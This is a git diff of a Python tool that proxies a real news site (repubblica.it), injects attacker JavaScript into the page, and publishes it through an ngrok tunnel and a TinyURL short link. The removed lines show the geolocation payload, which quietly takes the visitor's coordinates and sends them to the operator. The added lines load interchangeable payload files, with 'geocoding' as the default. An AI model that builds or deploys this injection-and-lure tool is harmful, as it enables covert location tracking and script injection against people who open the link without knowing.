@@ -2,9 +2,11 @@
 
 from bs4 import BeautifulSoup	
 import json 
-import urllib, os, subprocess
-from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
+import os, subprocess
+from urllib.request import urlopen
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from multiprocessing import Process
+from functools import partial
 
 
 PORT_NUMBER = 8080
@@ -13,24 +15,21 @@ url = "https://www.repubblica.it"
 #This class will handles any incoming request from
 #the browser 
 class injectionHandler(BaseHTTPRequestHandler):
-	
+	payload = ""
+	def __init__(self, payload, *args, **kwargs):
+		self.payload = payload
+		super().__init__(*args, **kwargs)
+
 	def inject(self,content):
+		payload = open("payloads/" + self.payload + ".js",'r').read()
 		html = BeautifulSoup(content,features="html.parser")
 		if html.body:
 			script = html.new_tag(
 				"script",				
 				type='application/javascript')
-			script.string="""
-			navigator.geolocation.getCurrentPosition(
-				function (position) {
-					var xhr = new XMLHttpRequest(); 
-					xhr.open('GET', '/payload/' + position.coords.latitude + '_' + position.coords.longitude , true);
-					xhr.send();
-				}
-			);
-			"""
+			script.string=payload
 			html.body.insert(0, script)
-			return str(html)
+			return str(html).encode()
 		
 	
 	#Handler for the GET requests
@@ -42,7 +41,7 @@ class injectionHandler(BaseHTTPRequestHandler):
 		self.send_response(200)
 		self.send_header('Content-type','text/html')
 		self.end_headers()
-		self.wfile.write(self.inject(urllib.urlopen(url).read()))
+		self.wfile.write(self.inject(urlopen(url).read()))
 		return
 		
 	def log_message(self, format, *args):
@@ -50,7 +49,7 @@ class injectionHandler(BaseHTTPRequestHandler):
 
 def urlShortener(nurl):
 	url = 'http://tinyurl.com/api-create.php?url=' + nurl
-	r = urllib.urlopen(url).read() 
+	r = urlopen(url).read() 
 	return str(r)
 
 
@@ -61,7 +60,7 @@ def getNgrokStats():
 	output=""
 	while output == "":
 		try:
-			raw_output = urllib.urlopen("http://localhost:4040/api/tunnels").read().decode()
+			raw_output = urlopen("http://localhost:4040/api/tunnels").read().decode()
 			data = json.loads(raw_output)
 			output = data['tunnels'][0]['public_url']
 		except Exception as e:
@@ -83,7 +82,8 @@ def startServer():
 	try:
 		#Create a web server and define the handler to manage the
 		#incoming request
-		server = HTTPServer(('', PORT_NUMBER), injectionHandler)
+		handler = partial(injectionHandler, "geocoding")
+		server = HTTPServer(('', PORT_NUMBER), handler)
 		print ('Started httpserver on port ' , PORT_NUMBER)
 		
 		#Wait forever for incoming htto requests
